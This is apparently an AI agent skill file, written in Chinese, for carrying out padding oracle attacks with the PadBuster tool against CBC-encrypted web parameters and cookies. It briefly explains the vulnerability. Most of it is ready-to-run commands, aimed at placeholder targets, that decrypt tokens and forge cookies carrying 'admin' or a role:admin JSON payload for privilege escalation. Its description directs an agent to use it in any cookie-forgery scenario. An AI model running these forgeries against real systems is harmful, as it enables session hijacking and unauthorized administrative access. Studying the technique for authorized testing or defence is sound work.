---
name: padbuster-padding-oracle
description: "使用 PadBuster 进行 Padding Oracle 攻击。当发现 Web 应用使用 CBC 模式加密且存在 Padding Oracle 漏洞时使用。PadBuster 可自动解密密文和伪造任意明文对应的合法密文，适用于加密 Cookie/Token/URL 参数。任何涉及 Padding Oracle 攻击、CBC 密文解密、Cookie 伪造的场景都应使用此技能"
metadata:
  tags: "padbuster,padding oracle,CBC,加密,解密,Cookie伪造,AES,DES,密文,token"
  category: "tool"
---

# PadBuster Padding Oracle 攻击方法论

PadBuster 是 Padding Oracle 攻击的自动化工具。核心能力：**自动解密 CBC 密文** + **伪造任意明文的合法密文** + **支持多种编码**。

项目地址：https://github.com/AonCyberLabs/PadBuster

## 漏洞原理

Padding Oracle 漏洞出现在使用 CBC 模式块加密（AES-CBC/DES-CBC）的应用中，当应用对 padding 错误和其他错误返回不同响应时，攻击者可逐字节还原明文或构造任意密文。

## Phase 1: 解密模式

```bash
# 解密 URL 参数中的密文（Base64 编码，AES-128）
padbuster "http://target/api?token=ENCRYPTED_VALUE" "ENCRYPTED_VALUE" 16 -encoding 0

# 解密 Cookie 中的密文
padbuster "http://target/" "BASE64_CIPHER" 16 \
  -cookies "auth=BASE64_CIPHER" -encoding 0

# Hex 编码的密文
padbuster "http://target/page?data=HEX_CIPHER" "HEX_CIPHER" 16 -encoding 1

# DES-CBC（块大小 8）
padbuster "http://target/page?token=ENC" "ENC" 8 -encoding 0
```

## Phase 2: 加密模式（伪造密文）

```bash
# 伪造 Cookie 值（最危险的利用方式）
padbuster "http://target/" "BASE64_CIPHER" 16 \
  -cookies "auth=BASE64_CIPHER" -encoding 0 \
  -plaintext "admin"

# 伪造 JSON 内容
padbuster "http://target/" "BASE64_CIPHER" 16 \
  -cookies "session=BASE64_CIPHER" -encoding 0 \
  -plaintext '{"role":"admin","uid":1}'
```

## Phase 3: 高级选项

```bash
# 自定义错误识别（当服务器不用 HTTP 状态码区分时）
padbuster "http://target/decrypt?data=ENC" "ENC" 16 \
  -encoding 0 -error "Invalid padding"

# URL 前缀（密文在 URL 路径中）
padbuster "http://target/api/ENCRYPTED/action" "ENCRYPTED" 16 \
  -encoding 0 -prefix "http://target/api/"

# 密文不含 IV
padbuster "http://target/?data=ENC" "ENC" 16 -encoding 0 -noiv

# 详细输出
padbuster "http://target/?data=ENC" "ENC" 16 -encoding 0 -veryverbose

# 恢复中断的攻击（已知 intermediate 值）
padbuster "http://target/?data=ENC" "ENC" 16 \
  -encoding 0 -intermediate "KNOWN_INTERMEDIATE_HEX"
```

## 编码对照表

| 编码值 | 格式 | 说明 |
|--------|------|------|
| 0 | Base64 | 最常见 |
| 1 | hex (小写) | a-f 格式 |
| 2 | hex (大写) | A-F 格式 |
| 3 | .NET UrlToken | ASP.NET 特有 |
| 4 | WebSafe Base64 | URL 安全的 Base64 |
